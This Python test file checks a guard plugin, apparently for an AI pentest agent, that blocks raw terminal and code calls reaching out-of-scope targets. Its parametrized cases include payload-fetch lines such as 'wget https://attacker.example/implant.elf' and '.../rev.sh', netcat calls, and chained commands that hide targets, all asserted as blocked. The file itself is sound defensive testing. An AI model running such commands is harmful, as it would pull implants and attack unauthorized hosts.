"""Regression tests for Violin's raw-terminal policy."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from plugins.violin_guard import TOOL_DEFINITIONS, register
from plugins.violin_guard import handlers as service
from plugins.violin_guard.core import bootstrap, schemas, state
from plugins.violin_guard.core import history as execution_history
from plugins.violin_guard.core.skill_receipts import SkillViewResult
from plugins.violin_guard.gates import command as guard_command
from plugins.violin_guard.handlers import ptt_handlers
from plugins.violin_guard.hooks import (
    _on_session_finalize_hook,
    _on_session_reset_hook,
    _post_tool_call_hook,
    _pre_llm_call_hook,
    _pre_tool_call_hook,
)
from tests.guard.receipt_fixture import bind_active_task

_SCOPE = """targets:
  ip_addresses: ["10.10.10.10"]
  in_scope_urls: []
exclusions: {}
authorized_parties: ["test owner"]
authorisation:
  confirmed: true
rules_of_engagement:
  allowed_actions: [recon]
  forbidden_actions: []
engagement:
  name: audit-test
  date: "2026-07-16"
  type: authorised-pentest
  client: test
"""


class _Context:
    def __init__(self) -> None:
        self.hooks: dict[str, object] = {}
        self.tools: dict[str, dict] = {}

    def register_tool(self, **kwargs) -> None:
        self.tools[kwargs["name"]] = kwargs

    def register_hook(self, name: str, callback) -> None:
        self.hooks[name] = callback


def test_plugin_registers_terminal_policy_hook() -> None:
    context = _Context()
    register(context)
    assert context.hooks["pre_tool_call"] is _pre_tool_call_hook
    assert context.hooks["post_tool_call"] is _post_tool_call_hook


def test_every_registered_tool_strictly_rejects_argv_injection() -> None:
    context = _Context()
    register(context)
    assert set(context.tools) == {definition.name for definition in TOOL_DEFINITIONS}
    for definition in TOOL_DEFINITIONS:
        result = json.loads(context.tools[definition.name]["handler"]({"_argv": ["whoami"]}))
        assert result["status"] == "invalid_arguments", definition.name
        assert any(error["type"] == "extra_forbidden" for error in result["errors"])
        assert (
            definition.schema["parameters"]
            == schemas.to_tool_schema(definition.model)["parameters"]
        )


def test_registered_hypothesis_update_preserves_omitted_fields(tmp_path) -> None:
    eng = _engagement(tmp_path)
    context = _Context()
    register(context)
    invoke = context.tools["violin_record_hypothesis"]["handler"]

    created = json.loads(
        invoke(
            {
                "eng_dir": str(eng),
                "id": "H-001",
                "title": "Preserve partial fields",
                "status": "Candidate",
                "phase": "RECON",
                "target": "10.10.10.10",
                "confidence": "0.7",
                "vuln_class": "access-control",
                "cve_research": "NVD queried; no applicable CVE",
                "exploit_research": "ExploitDB queried; no applicable PoC",
            }
        )
    )
    assert created["status"] == "ok"

    evidence = eng / "evidence" / "executions" / "validated.json"
    evidence.parent.mkdir(parents=True, exist_ok=True)
    evidence.write_text('{"status":"completed"}', encoding="utf-8")
    updated = json.loads(
        invoke(
            {
                "eng_dir": str(eng),
                "id": "H-001",
                "status": "Validated",
                "runtime_evidence": "evidence/executions/validated.json",
            }
        )
    )

    assert updated["status"] == "ok"
    hypothesis = updated["hypothesis"]
    assert hypothesis["confidence"] == "0.7"
    assert hypothesis["phase"] == "RECON"
    assert hypothesis["target"] == "10.10.10.10"
    assert hypothesis["vuln_class"] == "access-control"
    assert hypothesis["cve_research"] == "NVD queried; no applicable CVE"
    assert hypothesis["exploit_research"] == "ExploitDB queried; no applicable PoC"


def test_raw_terminal_target_command_is_blocked() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": "nmap -sV 10.10.10.10"},
        session_id="test-session",
    )

    assert result["action"] == "block"
    assert "violin_exec" in result["message"]


def test_raw_terminal_target_url_is_blocked() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": "python exploit.py https://10.10.10.10/preview"},
        session_id="test-session",
    )

    assert result["action"] == "block"


def test_script_interpreter_with_target_literal_is_blocked() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": "python exploit.py 10.10.10.10"},
    )

    assert result["action"] == "block"


def test_wrapped_target_utility_is_blocked() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": "docker exec kali-pentest nmap -sV 10.10.10.10"},
    )

    assert result["action"] == "block"


@pytest.mark.parametrize(
    "raw_command",
    [
        "rustscan -a 10.10.10.10",
        "enum4linux-ng -A 10.10.10.10",
        "impacket-smbclient user:pass@10.10.10.10",
        "sh -c 'feroxbuster -u http://10.10.10.10'",
    ],
)
def test_raw_terminal_blocks_arbitrary_target_tools_without_a_name_list(
    raw_command: str,
) -> None:
    result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})
    assert result["action"] == "block"
    assert "violin_exec" in result["message"]


@pytest.mark.parametrize(
    "raw_command",
    [
        "git clone https://github.com/example/project.git",
        "curl https://raw.githubusercontent.com/example/repo/main/poc.c",
        "curl -sL https://gist.githubusercontent.com/example/123/raw/exploit.py",
        "wget https://raw.githubusercontent.com/example/repo/main/Makefile",
    ],
)
def test_local_source_retrieval_remains_available(raw_command: str) -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": raw_command},
    )

    assert result is None


@pytest.mark.parametrize(
    "raw_command",
    [
        "echo x | nc victim.example 80",
        "git clone https://github.com/org/repo; curl https://victim.example/admin",
        "git clone https://github.com/org/repo && nmap victim.example",
        (
            "pip install https://files.pythonhosted.org/package.whl "
            "https://victim.example/package.whl"
        ),
    ],
)
def test_compound_terminal_commands_cannot_hide_target_segments(raw_command: str) -> None:
    result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})

    assert result["action"] == "block"
    assert "violin_exec" in result["message"]


@pytest.mark.parametrize(
    "raw_command",
    [
        "curl https://victim.example/admin",
        "curl -o payload.bin http://10.10.10.10/shell",
        "wget https://attacker.example/implant.elf",
        "wget -q http://192.168.1.100:8000/rev.sh",
    ],
)
def test_curl_wget_to_non_source_host_is_blocked(raw_command: str) -> None:
    result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})

    assert result is not None
    assert result["action"] == "block"
    assert "violin_exec" in result["message"]


@pytest.mark.parametrize(
    "raw_command",
    [
        "git clone https://github.com/example/project.git && echo cloned",
        "echo local | cat",
    ],
)
def test_safe_compound_terminal_commands_remain_available(raw_command: str) -> None:
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command}) is None


def test_safe_local_terminal_command_remains_available() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": "git status --short"},
        session_id="test-session",
    )

    assert result is None


def test_local_payload_content_with_a_url_is_not_target_execution() -> None:
    command = "printf '<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>' > payload.svg"
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": command}) is None


@pytest.mark.parametrize(
    "raw_command",
    [
        r"dir \\victim.example\share",
        r"Get-Content \\10.10.10.10\share\loot.txt",
        "cat //victim.example/share/loot.txt",
        "TARGET=10.10.10.10; nmap -sV $TARGET",
        "$TargetHost='victim.example'; curl https://$TargetHost/admin",
    ],
)
def test_terminal_blocks_network_shares_and_indirect_targets(raw_command: str) -> None:
    result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})
    assert result and result["action"] == "block"


@pytest.mark.parametrize(
    "raw_command",
    [
        "echo 13.99",
        "PRICE=13.99; echo $PRICE",
        "pip install requests",
        "git status --short",
    ],
)
def test_terminal_keeps_numeric_prices_and_local_package_work_available(
    raw_command: str,
) -> None:
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command}) is None


def test_local_script_paths_are_not_treated_as_hosts() -> None:
    assert (
        _pre_tool_call_hook(tool_name="terminal", args={"command": "python scripts/setup.py"})
        is None
    )
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": "bash ./run.py"}) is None
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": "sh deploy.sh"}) is None
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": "cat exploit.log"}) is None
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": "rm -f exploit.log"}) is None


def test_local_file_path_containing_an_ip_is_not_treated_as_a_socket() -> None:
    assert (
        _pre_tool_call_hook(
            tool_name="terminal", args={"command": "cat /tmp/file-with-10.10.14.233.txt"}
        )
        is None
    )


@pytest.mark.parametrize(
    "raw_command",
    [
        (
            "python3 scripts/violin_guard.py init-engagement --ctf "
            '--session-id htb1 --host 10.10.10.10 "$ENG_DIR"'
        ),
        (
            "python $HOME/.hermes/profiles/violin/scripts/violin_guard.py "
            'init-engagement --host victim.example "$ENG_DIR"'
        ),
    ],
)
def test_init_engagement_accepts_direct_scope_host(raw_command: str) -> None:
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command}) is None


@pytest.mark.parametrize(
    "raw_command",
    [
        (
            "python3 scripts/violin_guard.py init-engagement --ctf "
            '--host "$(cat /tmp/target)" "$ENG_DIR"'
        ),
        ('python3 scripts/violin_guard.py init-engagement --host "$TARGET" "$ENG_DIR"'),
        ('python3 scripts/violin_guard.py init-engagement --host=`cat /tmp/target` "$ENG_DIR"'),
    ],
)
def test_init_engagement_rejects_indirect_scope_host(raw_command: str) -> None:
    result = _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command})

    assert result["action"] == "block"
    assert "pass --host directly" in result["message"]


def test_other_guard_commands_do_not_inherit_bootstrap_exception() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={
            "command": (
                "python3 scripts/violin_guard.py check-command "
                "--target 10.10.10.10 --command whoami"
            )
        },
    )

    assert result["action"] == "block"


def test_non_python_command_cannot_impersonate_bootstrap_exception() -> None:
    result = _pre_tool_call_hook(
        tool_name="terminal",
        args={"command": "nmap scripts/violin_guard.py init-engagement --host 10.10.10.10"},
    )

    assert result["action"] == "block"


def test_ptt_pre_tool_hook_persists_real_runtime_session(tmp_path) -> None:
    eng = tmp_path / "session-hook"
    assert bootstrap.init_engagement(eng, session_id="bootstrap-alias") == 0

    assert (
        _pre_tool_call_hook(
            tool_name="violin_record_ptt",
            args={"eng_dir": str(eng), "session_id": "untrusted-argument"},
            session_id="runtime-session",
        )
        is None
    )
    assert state.resolve_session_id(eng) == "runtime-session"


class _ReadySkillAdapter:
    def view(self, *_args, **_kwargs) -> SkillViewResult:
        return SkillViewResult(True, "pentest skill")


def test_runtime_binding_syncs_to_active_execution_alias(tmp_path: Path, monkeypatch) -> None:
    eng = tmp_path / "engagement"
    assert (
        bootstrap.init_engagement(
            eng,
            host="10.10.10.10",
            ctf=True,
            session_id="bootstrap-alias",
        )
        == 0
    )
    monkeypatch.setattr(
        ptt_handlers,
        "HermesSkillViewAdapter",
        _ReadySkillAdapter,
    )
    _pre_tool_call_hook(
        tool_name="violin_record_ptt",
        args={"eng_dir": str(eng)},
        session_id="runtime-session",
    )
    ptt_args = {
        "eng_dir": str(eng),
        "id": "PT-CTF-001",
        "status": "[~]",
        "note": "starting service enumeration",
        "skill": "pentest",
        "technique": "service-enumeration",
    }

    prepared = json.loads(service.handle_record_ptt(ptt_args))
    assert prepared["status"] == "skill_prepared"
    bound = json.loads(service.handle_record_ptt(ptt_args))
    assert bound["status"] == "ok"

    receipts = json.loads((eng / "state" / "skills.json").read_text(encoding="utf-8"))
    assert receipts["context"]["session_id"] == "runtime-session"
    assert {item["session_id"] for item in receipts["deliveries"].values()} == {"runtime-session"}
    assert receipts["bindings"]["PT-CTF-001"]["session_id"] == "runtime-session"


def test_target_tools_require_an_engagement_binding() -> None:
    result = _pre_tool_call_hook(
        tool_name="violin_exec",
        args={"command": "nmap -sV 10.10.10.10"},
        session_id="test-session",
    )

    assert result["action"] == "block"
    assert "engagement associated" in result["message"]


def test_skill_binding_blocks_same_model_call_then_allows_continuation(tmp_path) -> None:
    eng = _engagement(tmp_path)
    _pre_llm_call_hook(session_id="test", eng_dir=str(eng))
    _post_tool_call_hook(
        tool_name="violin_record_ptt",
        args={"eng_dir": str(eng), "id": "PT-010"},
        result='{"status":"ok","task_id":"PT-010"}',
        turn_id="user-turn",
        api_request_id="model-call-bind",
    )

    blocked = _pre_tool_call_hook(
        tool_name="violin_exec",
        args={"eng_dir": str(eng), "session_id": "test"},
        session_id="test",
        turn_id="user-turn",
        api_request_id="model-call-bind",
    )
    assert blocked["action"] == "block"
    assert "next model continuation" in blocked["message"]

    browser_blocked = _pre_tool_call_hook(
        tool_name="browser_navigate",
        args={"url": "https://10.10.10.10"},
        session_id="test",
        turn_id="user-turn",
        api_request_id="model-call-bind",
    )
    assert browser_blocked["action"] == "block"

    assert (
        _pre_tool_call_hook(
            tool_name="browser_navigate",
            args={"url": "https://10.10.10.10"},
            session_id="test",
            turn_id="user-turn",
            api_request_id="model-call-next",
        )
        is None
    )


def test_legacy_receipt_without_api_request_id_uses_turn_fallback(tmp_path) -> None:
    eng = _engagement(tmp_path)
    _post_tool_call_hook(
        tool_name="violin_record_ptt",
        args={"eng_dir": str(eng), "id": "PT-010"},
        result='{"status":"ok","task_id":"PT-010"}',
        turn_id="legacy-turn",
    )

    blocked = _pre_tool_call_hook(
        tool_name="violin_exec",
        args={"eng_dir": str(eng), "session_id": "test"},
        session_id="test",
        turn_id="legacy-turn",
    )
    assert blocked["action"] == "block"


def test_session_reset_invalidates_active_skill_binding(tmp_path) -> None:
    eng = _engagement(tmp_path)
    _pre_llm_call_hook(session_id="test", eng_dir=str(eng))
    _on_session_reset_hook(session_id="test")

    blocked = _pre_tool_call_hook(
        tool_name="violin_exec",
        args={"eng_dir": str(eng), "session_id": "test"},
        session_id="test",
        turn_id="after-reset",
    )
    assert blocked["action"] == "block"
    assert "stale after a context reset" in blocked["message"]


def _engagement(tmp_path):
    eng = tmp_path / "engagement"
    assert bootstrap.init_engagement(eng, host="10.10.10.10") == 0
    (eng / "scope" / "scope.yaml").write_text(_SCOPE, encoding="utf-8")
    (eng / "state" / ".skill-loaded-test").write_text("skill-loaded: test\n", encoding="utf-8")
    ptt = eng / "state" / "ptt.md"
    ptt.write_text(
        ptt.read_text(encoding="utf-8").replace("| PT-010 | [ ] |", "| PT-010 | [~] |"),
        encoding="utf-8",
    )
    bind_active_task(eng, "test")
    return eng


@pytest.mark.parametrize(
    "guarded_command",
    [
        "rustscan -a 10.10.10.10",
        "enum4linux-ng -A 10.10.10.10",
        "impacket-smbclient user:pass@10.10.10.10",
    ],
)
def test_guard_accepts_arbitrary_installed_cli_tool_names(tmp_path, guarded_command: str) -> None:
    eng = _engagement(tmp_path)
    result = guard_command.check_command(
        guard_command.CheckCommandArgs(
            command=guarded_command,
            phase="recon",
            eng_dir=str(eng),
            target="10.10.10.10",
            session_id="test",
        )
    )
    assert not result.errors


def _code(eng, target="10.10.10.10") -> str:
    return (
        '# violin: {"eng_dir":"'
        + str(eng).replace("\\", "\\\\")
        + '","phase":"RECON","target":"'
        + target
        + '","session_id":"test"}\n'
        "print('local audit work')\n"
    )


def test_execute_code_requires_valid_metadata(tmp_path) -> None:
    blocked = _pre_tool_call_hook(
        tool_name="execute_code",
        args={"code": "print('missing header')"},
        tool_call_id="invalid-header",
    )
    assert blocked["action"] == "block"
    assert "first-line metadata" in blocked["message"]

    blocked = _pre_tool_call_hook(
        tool_name="execute_code",
        args={"code": _code(_engagement(tmp_path), "10.10.10.11")},
        tool_call_id="invalid-target",
    )
    assert blocked["action"] == "block"
    assert "Violin guard" in blocked["message"]


def test_execute_code_missing_fields_surfaces_header_schema(tmp_path) -> None:
    code = '# violin: {"eng_dir":"/tmp/test"}\nprint(1)'
    blocked = _pre_tool_call_hook(
        tool_name="execute_code", args={"code": code}, tool_call_id="missing-fields"
    )
    assert blocked["action"] == "block"
    assert "Header format" in blocked["message"]
    assert "session_id via violin_status" in blocked["message"]


def test_execute_code_is_validated_and_recorded(tmp_path) -> None:
    eng = _engagement(tmp_path)
    source = _code(eng) + "import requests\nrequests.get('https://10.10.10.10')\n"
    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": source},
            session_id="test",
            tool_call_id="recorded-call",
        )
        is None
    )
    intent_receipts = list((eng / "evidence" / "executions").glob("*-execute-code.json"))
    assert len(intent_receipts) == 1
    intent = json.loads(intent_receipts[0].read_text(encoding="utf-8"))
    assert intent["status"] == "starting"
    assert intent["execution_class"] == "target_touching"
    assert intent["sync_accounted"] is True
    assert state.sync_credit_remaining(eng, "RECON") == 9
    assert state.has_pending_sync(eng)

    _post_tool_call_hook(
        tool_name="execute_code",
        args={"code": source},
        result='{"result":"ok"}',
        duration_ms=42,
        session_id="test",
        tool_call_id="recorded-call",
    )

    receipts = list((eng / "evidence" / "executions").glob("*-execute-code.py"))
    assert len(receipts) == 1
    assert receipts[0].read_text(encoding="utf-8") == source
    history = (eng / "state" / "history.md").read_text(encoding="utf-8")
    assert "execute_code class=target_touching sha256=" in history
    assert "status=completed" in history
    assert "exit_code=0" in history
    pending = state.get_pending_sync(eng)
    assert pending is not None
    pending_command = pending["commands"][0]["command"]
    assert "duration_ms=" not in pending_command
    assert execution_history.history_contains(eng, pending_command)
    from plugins.violin_guard.handlers.ptt_rebind import _validate_pending_history
    from plugins.violin_guard.handlers.ptt_review import _validate_review_history

    _validate_review_history(str(eng), pending)
    _validate_pending_history(str(eng), pending)


def test_local_execute_code_is_recorded_without_target_sync_credit(tmp_path) -> None:
    eng = _engagement(tmp_path)
    source = _code(eng) + "import json\nprint(json.dumps({'local': True}))\n"
    before = state.sync_credit_remaining(eng, "RECON")

    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": source},
            session_id="test",
            tool_call_id="local-analysis",
        )
        is None
    )
    intent_receipts = list((eng / "evidence" / "executions").glob("*-execute-code.json"))
    assert len(intent_receipts) == 1
    intent = json.loads(intent_receipts[0].read_text(encoding="utf-8"))
    assert intent["execution_class"] == "local_analysis"
    assert intent["sync_accounted"] is False
    assert state.sync_credit_remaining(eng, "RECON") == before
    assert not state.has_pending_sync(eng)

    _post_tool_call_hook(
        tool_name="execute_code",
        args={"code": source},
        result='{"result":"ok"}',
        duration_ms=5,
        session_id="test",
        tool_call_id="local-analysis",
    )
    history = (eng / "state" / "history.md").read_text(encoding="utf-8")
    assert "execute_code class=local_analysis" in history


def test_local_execute_code_remains_available_when_target_credit_is_exhausted(tmp_path) -> None:
    eng = _engagement(tmp_path)
    for _ in range(state.sync_credit_limit("RECON")):
        state.spend_sync_credit(eng, "RECON")
    assert state.sync_credit_remaining(eng, "RECON") == 0

    source = _code(eng)
    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": source},
            session_id="test",
            tool_call_id="exhausted-local-analysis",
        )
        is None
    )
    _post_tool_call_hook(
        tool_name="execute_code",
        args={"code": source},
        result='{"result":"ok"}',
        duration_ms=1,
        session_id="test",
        tool_call_id="exhausted-local-analysis",
    )
    assert state.sync_credit_remaining(eng, "RECON") == 0
    assert not state.has_pending_sync(eng)


def test_execute_code_rejects_foreign_literal_target(tmp_path) -> None:
    eng = _engagement(tmp_path)
    source = _code(eng) + "url = 'https://10.10.10.11/admin'\n"
    blocked = _pre_tool_call_hook(
        tool_name="execute_code", args={"code": source}, tool_call_id="foreign-target"
    )
    assert blocked["action"] == "block"
    assert "differ from declared target" in blocked["message"]


def test_execute_code_local_find_paths_are_not_foreign_targets(tmp_path) -> None:
    """FIND-*.md / evidence path strings in code must not be flagged as foreign targets."""
    eng = _engagement(tmp_path)
    source = _code(eng) + (
        "local_files = ['evidence/findings/FIND-007.md', 'state/hypotheses.md']\n"
        "for f in local_files: print('author', f)\n"
    )
    blocked = _pre_tool_call_hook(
        tool_name="execute_code",
        args={"code": source},
        session_id="test",
        tool_call_id="local-find-paths",
    )
    # FIND/evidence path strings must not be flagged as foreign targets: either the
    # hook returns None (no block) or its message avoids the foreign-target error.
    if blocked is not None:
        assert blocked.get("action") != "block" or "differ from declared target" not in blocked.get(
            "message", ""
        )


def test_execute_code_completion_without_intent_is_an_audit_error(tmp_path) -> None:
    eng = _engagement(tmp_path)
    with pytest.raises(ValueError, match="intent receipt is missing"):
        _post_tool_call_hook(
            tool_name="execute_code",
            args={"code": _code(eng)},
            result='{"result":"ok"}',
            duration_ms=1,
            tool_call_id="missing-intent",
        )


def test_execute_code_records_tool_errors(tmp_path) -> None:
    eng = _engagement(tmp_path)
    source = _code(eng)
    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": source},
            session_id="test",
            tool_call_id="error-call",
        )
        is None
    )
    _post_tool_call_hook(
        tool_name="execute_code",
        args={"code": source},
        result='{"error":"sandbox failed"}',
        duration_ms=7,
        session_id="test",
        tool_call_id="error-call",
    )
    history = (eng / "state" / "history.md").read_text(encoding="utf-8")
    assert "status=completed_with_error" in history
    assert "exit_code=1" in history


def test_execute_code_requires_tool_call_id_before_writing_intent(tmp_path) -> None:
    eng = _engagement(tmp_path)
    blocked = _pre_tool_call_hook(tool_name="execute_code", args={"code": _code(eng)})

    assert blocked == {
        "action": "block",
        "message": "execute_code requires Hermes tool_call_id for receipt correlation",
    }
    assert not list((eng / "evidence" / "executions").glob("*-execute-code.json"))


def test_parallel_execute_code_calls_correlate_by_tool_call_id(tmp_path) -> None:
    eng = _engagement(tmp_path)
    first = _code(eng) + "print('first call')\n"
    second = _code(eng) + "print('second call')\n"

    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": first},
            session_id="test",
            tool_call_id="parallel-1",
        )
        is None
    )
    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": second},
            session_id="test",
            tool_call_id="parallel-2",
        )
        is None
    )

    _post_tool_call_hook(
        tool_name="execute_code",
        args={"code": first},
        result='{"result":"first"}',
        duration_ms=11,
        session_id="test",
        tool_call_id="parallel-1",
    )
    _post_tool_call_hook(
        tool_name="execute_code",
        args={"code": second},
        result='{"result":"second"}',
        duration_ms=22,
        session_id="test",
        tool_call_id="parallel-2",
    )

    receipts = [
        json.loads(path.read_text(encoding="utf-8"))
        for path in (eng / "evidence" / "executions").glob("*-execute-code.json")
    ]
    assert sorted((receipt["status"], receipt["duration_ms"]) for receipt in receipts) == [
        ("completed", 11),
        ("completed", 22),
    ]


def test_session_finalize_abandons_unfinished_execute_code_receipt(tmp_path) -> None:
    eng = _engagement(tmp_path)
    source = _code(eng)
    assert (
        _pre_tool_call_hook(
            tool_name="execute_code",
            args={"code": source},
            session_id="test",
            tool_call_id="abandoned-call",
        )
        is None
    )

    _on_session_finalize_hook(session_id="test", eng_dir=str(eng))

    manifest = next((eng / "evidence" / "executions").glob("*-execute-code.json"))
    receipt = json.loads(manifest.read_text(encoding="utf-8"))
    assert receipt["status"] == "abandoned"
    with pytest.raises(ValueError, match="intent receipt is missing for tool_call_id"):
        _post_tool_call_hook(
            tool_name="execute_code",
            args={"code": source},
            result='{"result":"late"}',
            session_id="test",
            tool_call_id="abandoned-call",
        )


@pytest.mark.parametrize(
    "raw_command",
    [
        "python -m py_compile oauth_takeover.py",
        "python3 -m py_compile exploit.py",
        "python -m pytest tests/test_exploit.py",
        "python -c 'import py_compile; py_compile.compile(\"exploit.py\")'",
    ],
)
def test_local_script_syntax_and_test_checks_are_allowed(raw_command: str) -> None:
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command}) is None


@pytest.mark.parametrize(
    "raw_command",
    [
        "grep 10.10.10.10 access.log",
        "head -n 20 exploit.log",
        "ls -la",
        "rg 'function' .",
        "diff file1.py file2.py",
    ],
)
def test_expanded_local_file_tools_are_allowed(raw_command: str) -> None:
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command}) is None


@pytest.mark.parametrize(
    "raw_command",
    [
        "python3 -c 'import requests'",
        'python3 -c "import httpx"',
        "python3 -c 'import urllib.request, json'",
    ],
)
def test_local_package_import_checks_are_allowed(raw_command: str) -> None:
    assert _pre_tool_call_hook(tool_name="terminal", args={"command": raw_command}) is None
